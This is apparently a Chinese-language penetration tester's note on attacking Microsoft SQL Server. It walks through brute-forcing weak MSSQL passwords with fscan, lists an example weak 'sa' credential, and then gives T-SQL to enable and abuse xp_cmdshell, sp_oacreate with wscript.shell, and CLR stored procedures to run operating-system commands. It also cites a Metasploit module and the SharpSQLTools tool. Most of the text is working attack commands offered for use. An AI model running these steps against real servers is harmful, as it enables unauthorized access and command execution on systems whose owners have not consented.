---
tags:
  - database
create_time: 2024-10-17 15:13
modified_time: 2024-10-17 15:13
status: complete
---
## 0x01 sqlserver口令爆破

Sqlserver 弱口令爆破

```bash
fscan -h 10.1.2.3 -m mssql
```

## 0x02 sqlserver链接

Mssql sa: 123456@10.1.2.3

## 0x03 xp_cmdshell

> ​	“存储过程”：其实质就是一个“集合”，那么是什么样的结合呢，就是存储在SQL server中预先定义好的“SQL语句集合”，说的更直白一些就是使用T-SQL语言编写好的各种小脚本共同组成的集合体，我们称之为“存储过程”。
>
> ​	而存储过程中的这些小脚本中，其危险性最高的“小脚本”就是扩展存储过程中的“xp_cmdshell脚本”，它可以执行操作系统的任何指令。

1. 检查xp_cmdshell是否开启 `SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';`

![](../../../_Attachment/sqlserver.assets/file-20241017151507606.png)

2. 开启xp_cmdshell

   ```mssql
   EXEC sp_configure 'show advanced options', 1;
   RECONFIGURE;
   EXEC sp_configure 'xp_cmdshell', 1;
   RECONFIGURE;
   ```

![](../../../_Attachment/sqlserver.assets/file-20241017151515698.png)

3. 命令执行
   `master..xp_cmdshell 'whoami';`

![](../../../_Attachment/sqlserver.assets/file-20241017151524027.png)



- Msf模块 auxiliary/admin/mssql/mssql_exec

![](../../../_Attachment/sqlserver.assets/file-20241017151531461.png)

## 0x04 sp_oacreate

1. 检查sp_oacreate是否开启 `SELECT * FROM sys.configurations WHERE name = 'ole automation procedures';`

![](../../../_Attachment/sqlserver.assets/file-20241017151537630.png)

2. 开启sp_oacreate

   ```mssql
   EXEC sp_configure 'show advanced options', 1;
   RECONFIGURE;
   EXEC sp_configure 'ole automation procedures', 1;
   RECONFIGURE;
   ```

![](../../../_Attachment/sqlserver.assets/file-20241017151545539.png)

3. 执行命令

   ```mssql
   declare @shell int
   exec sp_oacreate 'wscript.shell',@shell output
   exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c whoami >C:\\1.txt'
   ```

## 0x05 CLR

1. 检查CLR是否开启 `SELECT * FROM sys.configurations WHERE name = 'clr enabled'`

![](../../../_Attachment/sqlserver.assets/file-20241017151556167.png)

2. 创建CLR程序集

![](../../../_Attachment/sqlserver.assets/file-20241017151603585.png)

3. 创建存储过程

   ```mssql
   CREATE PROCEDURE [dbo].[SqlStoredProcedure1] AS EXTERNAL NAME [Database3].[StoredProcedures].[SqlStoredProcedure1]
   ```

![](../../../_Attachment/sqlserver.assets/file-20241017151611403.png)

4. 调用存储过程执行命令 `EXEC [dbo].[SqlStoredProcedure1];`

![](../../../_Attachment/sqlserver.assets/file-20241017151617896.png)

## 0x06 综合工具SharpSQLTools

- https://github.com/uknowsec/SharpSQLTools

![](../../../_Attachment/sqlserver.assets/file-20241017151639089.png)
